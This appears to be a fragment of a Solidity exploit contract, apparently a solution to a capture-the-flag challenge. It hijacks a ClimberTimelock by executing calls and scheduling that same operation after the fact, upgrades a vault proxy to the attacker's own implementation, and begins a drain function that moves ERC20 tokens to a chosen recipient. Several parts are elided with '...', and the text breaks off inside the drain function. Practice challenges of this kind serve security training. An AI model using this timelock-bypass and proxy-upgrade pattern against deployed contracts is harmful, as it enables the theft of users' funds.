 ...
 */
contract ClimberVaultHijacker is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    ...
    /*To be called directly through implementation*/
    function hijack(address climberTimelockAddress, address climberVaultAddress) external {
        ClimberTimelock ct = ClimberTimelock(payable(climberTimelockAddress));
        ...
        dataElements[1] = abi.encodeWithSelector( ClimberVaultHijacker.scheduleForwarder.selector, climberTimelockAddress, climberVaultAddress  );
        dataElements[2] = abi.encodeWithSelector( UUPSUpgradeable.upgradeTo.selector, address(this) );

        ct.execute(targets, values, dataElements, bytes32(0));

    }

    function scheduleForwarder(address climberTimelockAddress, address climberVaultAddress) external {
        ClimberTimelock ct = ClimberTimelock(payable(climberTimelockAddress));
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        ...
        ct.schedule(targets, values, dataElements, bytes32(0));
    }

    /*To be called through the proxy*/
    function drain(address tokenAddress, address recipient) external {
        IERC20 token = IERC20(tokenAddress);
